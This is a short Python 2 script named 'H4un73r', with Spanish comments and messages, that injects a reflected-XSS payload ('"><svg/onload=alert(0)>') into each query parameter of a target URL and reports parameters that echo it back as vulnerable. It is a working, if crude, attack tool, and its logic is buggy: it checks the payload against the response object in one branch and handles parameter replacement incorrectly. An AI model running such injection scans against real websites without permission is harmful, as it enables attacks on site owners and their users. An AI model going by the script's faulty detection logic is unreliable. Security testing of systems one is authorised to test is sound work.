#!/usr/bin/python
import re
import requests
import argparse
import terminal_banner
import urlparse
import colorama
from colorama import Fore, Back, Style
colorama.init()


parser = argparse.ArgumentParser()
parser.add_argument("-v", "--version", help="show program version", action="store_true")
parser.add_argument("-u", "--url",dest='url', default=None, help="url attack: http://www.target.com/?s=1&x=2&y=3", action="store")
parser.add_argument("-f", "--file", help="file attack", action="store_true")

# read arguments from the command line
args = parser.parse_args()
payloads = ['"><svg/onload=alert(0)>'] #file in comming 

# check for --version or -V
if args.version:
    print("this is myprogram version 0.1")
    exit()

if args.url:
    def get():
        banner_text = "H4un73r.\nForce Brute Payloads in parameters."
        my_banner = terminal_banner.Banner(banner_text)
        print my_banner
        #res = requests.get(args.url)
        url = args.url
        #print res.status_code
        
        #detectar paramatros
        def paramater():
            parsed = urlparse.urlparse(args.url)
            querys = parsed.query.split("&")
            temp = parsed.query.split("&")
            count = url.count("=")
    

            for inj in payloads:
                
                for qx in range(count):
                    payloa =  "=" + inj
                    beta = re.sub(r'[=][^&]*', payloa, querys[qx])
                    querys[qx] = beta
                    if qx > 0:
                        regres = re.sub(r'[=][^&]*', payloa, querys[qx])
                        querys[qx-1] = temp[qx-1]
                    #print querys
                    #unParam = "&".join([ "{}{}".format(query, inj) for query in querys])
                    twParam = "&".join(querys)
                    parsed = parsed._replace(query=twParam)
                    
                    
                response = requests.get(urlparse.urlunparse(parsed))

                if inj in response.text: #scrap pendiente por mejorar
                    
                    bba = "\n" + (Fore.GREEN + "La pagina web("+ str(response.status_code) +") es vulnerable en el parametro: "+ Fore.BLUE + twParam +Style.RESET_ALL) + "\n"
                    bann = terminal_banner.Banner(bba)
                    print bann
                elif inj not in response:
                        print (Fore.RED + "El siquiente parametro no es vulnerable :"+twParam + Style.RESET_ALL)
                       
                else:
                    print (Fore.RED + "Parametro(s) no alcanzables" +Style.RESET_ALL)


        paramater()
    get()
